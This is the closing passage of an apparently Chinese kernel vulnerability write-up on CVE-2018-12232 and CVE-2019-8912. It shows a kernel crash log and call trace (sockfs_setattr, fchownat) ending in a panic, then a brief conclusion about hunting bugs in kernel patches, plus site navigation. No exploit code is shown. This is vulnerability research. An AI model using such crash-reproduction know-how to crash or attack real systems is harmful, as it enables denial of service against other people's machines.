ffffffc0a134e080 <span class="number">0000000000000000</span> <span class="number">0000000000000000</span></div><div class="line">[<span class="number">25032.950583</span>] fc20: <span class="number">00000000000007</span>d0 <span class="number">0000000000000000</span> <span class="number">0000000000000000</span> <span class="number">0000000000000000</span></div><div class="line">[<span class="number">25032.950603</span>] fc40: <span class="number">0000004173</span>d33000 <span class="number">00000000003</span>ceaa4 <span class="number">0000000000000002</span> <span class="number">0000000000000005</span></div><div class="line">[<span class="number">25032.950623</span>] fc60: fffffffffffffffd <span class="number">0101010101010101</span> <span class="number">0000000000000003</span> <span class="number">0000000000000001</span></div><div class="line">[<span class="number">25032.950644</span>] fc80: <span class="number">0000000000000001</span> <span class="number">0000007f</span>e17f3aa8 ffffff80081b6598 <span class="number">0000000000000001</span></div><div class="line">[<span class="number">25032.950670</span>] [&lt;ffffff8008cc2284&gt;] sockfs_setattr+<span class="number">0x30</span>/<span class="number">0x40</span></div><div class="line">[<span class="number">25032.950709</span>] [&lt;ffffff80081cfbe4&gt;] notify_change2+<span class="number">0x22c</span>/<span class="number">0x348</span></div><div class="line">[<span class="number">25032.950737</span>] [&lt;ffffff80081b54b4&gt;] chown_common+<span class="number">0xac</span>/<span class="number">0x130</span></div><div class="line">[<span class="number">25032.950759</span>] [&lt;ffffff80081b6628&gt;] SyS_fchownat+<span class="number">0x90</span>/<span class="number">0xd0</span></div><div class="line">[<span class="number">25032.950788</span>] [&lt;ffffff8008082730&gt;] el0_svc_naked+<span class="number">0x24</span>/<span class="number">0x28</span></div><div class="line">[<span class="number">25032.950812</span>] Code: <span class="number">360800</span>a1 f9401a81 b9400a62 f85f0021 (b9025c22)</div><div class="line">[<span class="number">25032.950833</span>] ---[ end trace <span class="number">891e55</span>ff6a5e58d7 ]---</div><div class="line">[<span class="number">25034.044441</span>] Kernel panic - not syncing: Fatal exception</div><div class="line">[<span class="number">25034.044474</span>] CPU0: stopping</div></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>多看看内核补丁，看能不能通过补丁找到类似的漏洞，很有可能捡到一些漏洞呢。<br>希望早点捡到漏洞。</p>
</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://github.com">Let_go</a></p><p> <span>Link:  </span><a href="http://github.com/2019/04/03/CVE-2018-12232-And-CVE-2019-8912/">http://github.com/2019/04/03/CVE-2018-12232-And-CVE-2019-8912/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2019/04/10/CVE-2019-2054/" title="CVE-2019-2054"><span>< PreviousPost</span><br><span class="prevTitle">CVE-2019-2054</span></a><a class="nextSlogan" href="/2019/03/25/CVE-2018-9568/" title="CVE-2018-9568"><span>NextPost ></span><br><span class="nextTitle">CVE-2018-9568</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2018-12232-amp-amp-CVE-2019-8912"><span class="toc-number">1.</span> <span class="toc-text">CVE-2018-12232&&CVE-2019-8912</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞信息"><span class="toc-number">1.1.1.</span> <span class="toc-text">漏洞信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞原理"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞原理-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞造成的影响"><span class="toc-number">1.2.2.</span> <span class="toc-text">漏洞造成的影响</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#补丁用意"><span class="toc-number">1.2.3.</span> <span class="toc-text">补丁用意</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞模型"><span class="toc-number">1.2.4.</span> <span class="toc-text">漏洞模型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞复现"><span class="toc-number">1.2.5.</span> <span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Concept"><span class="toc-number">1.2.5.1.</span> <span class="toc-text">Proof of Concept</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Crash-Log"><span class="toc-number">1.2.5.2.</span> <span class="toc-text">Crash Log</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">1.3.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>